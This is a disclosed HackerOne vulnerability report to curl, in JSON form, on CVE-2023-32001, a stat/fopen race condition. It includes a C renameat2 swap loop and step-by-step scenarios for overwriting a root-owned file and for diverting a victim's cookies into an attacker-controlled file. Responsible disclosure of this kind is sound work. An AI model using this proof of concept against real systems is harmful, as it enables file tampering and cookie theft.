{
  "id": 2039870,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMDM5ODcw",
  "url": "https://hackerone.com/reports/2039870",
  "title": "CVE-2023-32001: fopen race condition",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "medium",
  "readable_substate": "Resolved",
  "created_at": "2023-06-27T07:05:59.747Z",
  "submitted_at": "2023-06-27T07:05:59.844Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "selmelc",
    "url": "/selmelc",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/68gqya4e30aqvzh8b8hd08wrb0y4/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
    },
    "is_me?": false,
    "cleared": false,
    "verified": true,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 35663,
    "url": "https://hackerone.com/curl",
    "handle": "curl",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "curl",
      "twitter_handle": "",
      "website": "https://curl.se",
      "about": "cURL is an Open Source project providing a library and command-line tool for doing internet transfers"
    }
  },
  "has_bounty?": false,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [
    "CVE-2023-32001"
  ],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2023-07-25T05:00:08.873Z",
  "bug_reporter_agreed_on_going_public_at": "2023-07-25T05:00:08.800Z",
  "team_member_agreed_on_going_public_at": "2023-07-24T21:23:44.369Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "As we can see in the following curl code (line 59-61 https://github.com/curl/curl/blob/fb802b521af997230b65174a559f5c419520e142/lib/fopen.c ): \n```C\n  if(stat(filename, &sb) == -1 || !S_ISREG(sb.st_mode)) {\n    /* a non-regular file, fallback to direct fopen() */\n    *fh = fopen(filename, FOPEN_WRITETEXT);\n...\n}\n...\n```\nThere is a race condition between the moment \"stat(filename, &sb)\" is executed and the moment \" fopen(filename, FOPEN_WRITETEXT);\" is executed.\nThis leads to undesirable behavior such as an attacker tricking a privileged user to overwrite protected files, or since this function (Curl_fopen) is also used for storing cookies an attacker could trick another user to send those cookies that might be very sensible to a file fully owned and controlled by the attacker.\n\n###POC/Steps to reproduce:\nBefore we start, I will be using a little program called \"rename\". Which simply swaps atomically the names of two files to be able to showcase this race condition. Here is its code :\n```\n#include <strings.h>\n#include <string.h>\n#include <stdlib.h>\n#include <sys/types.h>\n#include <sys/stat.h>\n#define _GNU_SOURCE\n#include <fcntl.h>\n#include <stdio.h>\n#include <unistd.h>\n#include <sys/syscall.h>\n#include <linux/fs.h>\n\n// source https://github.com/sroettger/35c3ctf_chals/blob/master/logrotate/exploit/rename.c\nint main(int argc, char *argv[]) {\n  while (1) {\n    syscall(SYS_renameat2, AT_FDCWD, argv[1], AT_FDCWD, argv[2], RENAME_EXCHANGE);\n  }\n  return 0;\n}\n```\n\nOpen two terminals, with two different users. One will be the attacker terminal and the other the victim. \nIn both POCs, the victim  will want to execute a command such as \"curl --cookie-jar a google.com\" thinking the file \"a\" doesn't exist.\n\n###A) Exploiting this vulnerability to trick a user to overwrite a file they own:\n\nAssume the current directory of both attacker(selmelc) and victim (root) looks like this\n```SHELL\nlrwxrwxrwx 1 selmelc selmelc     4 Jun 27 07:11 a -> flag\ndrwxrwxrwx 2 selmelc selmelc  4096 Jun 27 07:11 b\n-rw-r--r-- 1 root    root        6 Jun 27 07:05 flag\n-rwxr-x--- 1 selmelc selmelc 16608 Jun 27 07:04 rename\n```\nThe attacker executes ./rename a b, which will not stop to swap the name of the directory \"b\" and the symlink \"a\". \n\nThe victim executes their command \"curl --cookie-jar a google.com\".\nThe race condition is successfully exploited if in the vulnerable code the stat identifies the file \"a\" as a directory and then the \"fopen\" opens the symlink that points to the file \"flag\".\nIf that happened then the results looks like this :\n```\n...\n-rw-r--r-- 1 root    root      131 Jun 27 07:13 flag\n...\nroot@deb:/home/selmelc/Documents# cat flag\n# Netscape HTTP Cookie File\n# https://curl.se/docs/http-cookies.html\n# This file was generated by libcurl! Edit at your own risk.\n```\nAdditional note: \nYou might think \"well that's just how symlinks work\"... To clarify on that, by default if the victim was executing  \"curl --cookie-jar a google.com\" without the attacker exploiting the vuln. a different behavior would occur ; the file \"a\" would be erased (no more symlink) and overwritten as a regular file containing the cookie data. This happens because the stat function follows symbolic links therefore in that scenario we would not enter the vulnerable condition which leads to the race condition.\n\n###B) Exploiting this vulnerability to steal the victim's cookies and hide it from them:\n\nAs this uses the same logic as the previous exploit for this vuln. Repeat same steps except this time we want the \"flag\" file to be owned by the attacker as following:\n```\nlrwxrwxrwx 1 selmelc selmelc     4 Jun 27 08:42 a -> flag\ndrwxrwxrwx 2 selmelc selmelc  4096 Jun 27 08:41 b\n-rw--w--w- 1 selmelc selmelc     0 Jun 27 08:41 flag\n-rwxr-x--- 1 selmelc selmelc 16608 Jun 27 07:04 rename\n\n```\nNormal curl behavior after the victim executed  \"curl --cookie-jar a google.com\" :\n```\n-rw------- 1 root    root      131 Jun 27 08:49 a\ndrwxrwxrwx 2 selmelc selmelc  4096 Jun 27 08:41 b\n-rw--w--w- 1 selmelc selmelc     0 Jun 27 08:41 flag\n-rwxr-x--- 1 selmelc selmelc 16608 Jun 27 07:04 rename\n```\nBehaviour when vulnerability is exploited (and race condition met) : \n```\ndrwxrwxrwx 2 selmelc selmelc  4096 Jun 27 08:41 a\nlrwxrwxrwx 1 selmelc selmelc     4 Jun 27 08:50 b -> flag\n-rw--w--w- 1 selmelc selmelc   131 Jun 27 08:51 flag\n-rwxr-x--- 1 selmelc selmelc 16608 Jun 27 07:04 rename\n```\nWe can notice the 131 bytes of output in flag now, which would contain the sensitive cookies.\n\n## Impact\n\nAn attacker is able to overwrite files they shouldn't have access to, however the attacker does not control the data sent to those files. (Integrity, potentially availability issues if files likes /etc/passwd are modified through this).\nAn attacker may also gain access to sensitive data (cookies), and even hide that information from the intended receiver as the attacker may control the file in which this information will be leaked.\nNote : cookie storing was used to demonstrate exploits for the vulnerability but the vulnerability also affects HSTS and alt-svc cache.",
  "weakness": {
    "id": 105,
    "name": "Time-of-check Time-of-use (TOCTOU) Race Condition"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2023-08-23T21:23:44.487Z",
  "allow_singular_disclosure_after": -15009235.439179422,
  "singular_disclosure_allowed": true,
  "vote_count": 26,
  "voters": [
    "selmelc",
    "viberunner_",
    "zy9ard3",
    "cats_are_aliens",
    "neil-tsakatsa",
    "kerolesmagdy",
    "herm1k",
    "w0x42",
    "shreyashchauhan",
    "nsjy",
    "and 16 more..."
  ],
  "severity": {
    "rating": "medium",
    "author_type": "Team"
  },
  "structured_scope": null,
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
